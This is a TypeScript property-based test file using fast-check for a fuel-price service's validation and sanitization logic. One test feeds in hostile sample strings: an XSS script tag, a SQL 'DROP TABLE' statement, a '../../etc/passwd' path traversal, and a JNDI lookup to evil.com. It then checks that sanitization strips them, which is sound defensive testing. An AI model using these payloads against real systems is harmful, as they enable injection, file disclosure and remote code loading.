import * as fc from 'fast-check';
import { PriceUpdateService } from './PriceUpdateService';
import { FuelPrices } from '../types';

/**
 * Property-Based Tests for PriceUpdateService
 * Feature: fuel-price-management
 * 
 * These tests validate universal correctness properties across all valid inputs
 * using the fast-check library with 100+ iterations per test.
 */

describe('PriceUpdateService Property-Based Tests', () => {
  let priceUpdateService: PriceUpdateService;

  beforeEach(() => {
    priceUpdateService = new PriceUpdateService();
  });

  /**
   * Property 3: Price Validation and Range Enforcement
   * For any price input data, the system should accept values if and only if 
   * they are positive numbers within the range 0.01 to 999.99 with appropriate decimal precision.
   * Validates: Requirements 3.2, 7.3
   */
  describe('Property 3: Price Validation and Range Enforcement', () => {
    it('should accept valid prices and reject invalid ones', () => {
      fc.assert(
        fc.property(
          fc.record({
            regular: fc.double({ min: -1000, max: 2000, noNaN: true }),
            premium: fc.double({ min: -1000, max: 2000, noNaN: true }),
            diesel: fc.double({ min: -1000, max: 2000, noNaN: true })
          }),
          (prices: FuelPrices) => {
            const result = priceUpdateService.validatePriceData(prices);
            
            // Check if all prices are within valid range (0.01 to 999.99)
            const allPricesValid = Object.values(prices).every(price => 
              price >= 0.01 && price <= 999.99 && 
              Number.isFinite(price) &&
              // Check decimal precision (max 2 decimal places)
              (price.toString().split('.')[1] || '').length <= 2
            );
            
            // Property: validation result should match expected validity
            if (allPricesValid) {
              expect(result.isValid).toBe(true);
              expect(result.errors).toHaveLength(0);
            } else {
              expect(result.isValid).toBe(false);
              expect(result.errors.length).toBeGreaterThan(0);
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should consistently validate edge cases', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.constant(0.01), // Minimum valid price
            fc.constant(999.99), // Maximum valid price
            fc.constant(0.00), // Just below minimum
            fc.constant(1000.00), // Just above maximum
            fc.constant(-1), // Negative price
            fc.constant(0), // Zero price
            // Use integers and divide by 100 to avoid floating point precision issues
            fc.integer({ min: 1, max: 99999 }).map(n => n / 100) // Valid range with proper precision
          ),
          (price: number) => {
            const prices: FuelPrices = {
              regular: price,
              premium: price,
              diesel: price
            };
            
            const result = priceUpdateService.validatePriceData(prices);
            
            // Property: edge cases should be handled consistently
            // Check if price is in valid range AND has acceptable decimal precision
            const decimalPlaces = (price.toString().split('.')[1] || '').length;
            const isValidRange = price >= 0.01 && price <= 999.99;
            const isValidPrecision = decimalPlaces <= 2;
            const isFinite = Number.isFinite(price);
            
            if (isValidRange && isValidPrecision && isFinite) {
              expect(result.isValid).toBe(true);
            } else {
              expect(result.isValid).toBe(false);
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  /**
   * Property 8: Security and Input Sanitization
   * For any input data, the system should sanitize and validate all inputs,
   * and handle malicious data gracefully.
   * Validates: Requirements 7.1, 7.2, 7.4, 7.5
   */
  describe('Property 8: Security and Input Sanitization', () => {
    it('should sanitize any input data safely', () => {
      fc.assert(
        fc.property(
          fc.anything(),
          (rawInput: any) => {
            // Property: sanitization should never throw errors
            expect(() => {
              const sanitized = priceUpdateService.sanitizePriceData(rawInput);
              
              // Property: sanitized output should always be a valid FuelPrices object
              expect(typeof sanitized).toBe('object');
              expect(sanitized).toHaveProperty('regular');
              expect(sanitized).toHaveProperty('premium');
              expect(sanitized).toHaveProperty('diesel');
              
              // Property: all sanitized values should be numbers
              expect(typeof sanitized.regular).toBe('number');
              expect(typeof sanitized.premium).toBe('number');
              expect(typeof sanitized.diesel).toBe('number');
              
              // Property: sanitized values should not be NaN
              expect(Number.isFinite(sanitized.regular)).toBe(true);
              expect(Number.isFinite(sanitized.premium)).toBe(true);
              expect(Number.isFinite(sanitized.diesel)).toBe(true);
            }).not.toThrow();
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle malicious string inputs safely', () => {
      fc.assert(
        fc.property(
          fc.record({
            regular: fc.string(),
            premium: fc.string(),
            diesel: fc.string(),
            // Add potential injection attempts
            maliciousField: fc.oneof(
              fc.constant('<script>alert("xss")</script>'),
              fc.constant('DROP TABLE users;'),
              fc.constant('../../etc/passwd'),
              fc.constant('${jndi:ldap://evil.com}'),
              fc.string()
            )
          }),
          (maliciousInput: any) => {
            // Property: malicious input should be sanitized safely
            expect(() => {
              const sanitized = priceUpdateService.sanitizePriceData(maliciousInput);
              
              // Property: output should be clean numbers
              expect(typeof sanitized.regular).toBe('number');
              expect(typeof sanitized.premium).toBe('number');
              expect(typeof sanitized.diesel).toBe('number');
              
              // Property: no script tags or SQL injection should remain
              const serialized = JSON.stringify(sanitized);
              expect(serialized).not.toContain('<script>');
              expect(serialized).not.toContain('DROP TABLE');
              expect(serialized).not.toContain('../../');
              expect(serialized).not.toContain('${jndi:');
            }).not.toThrow();
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  /**
   * Property: Validation Consistency
   * For any input, validation should be deterministic and consistent
   */
  describe('Validation Consistency Property', () => {
    it('should produce consistent validation results', () => {
      fc.assert(
        fc.property(
          fc.record({
            regular: fc.double({ min: -100, max: 1100, noNaN: true }),
            premium: fc.double({ min: -100, max: 1100, noNaN: true }),
            diesel: fc.double({ min: -100, max: 1100, noNaN: true })
          }),
          (prices: FuelPrices) => {
            // Property: multiple validations of same input should yield same result
            const result1 = priceUpdateService.validatePriceData(prices);
            const result2 = priceUpdateService.validatePriceData(prices);
            
            expect(result1.isValid).toBe(result2.isValid);
            expect(result1.errors).toEqual(result2.errors);
          }
        ),
        { numRuns: 100 }
      );
    });
  });
});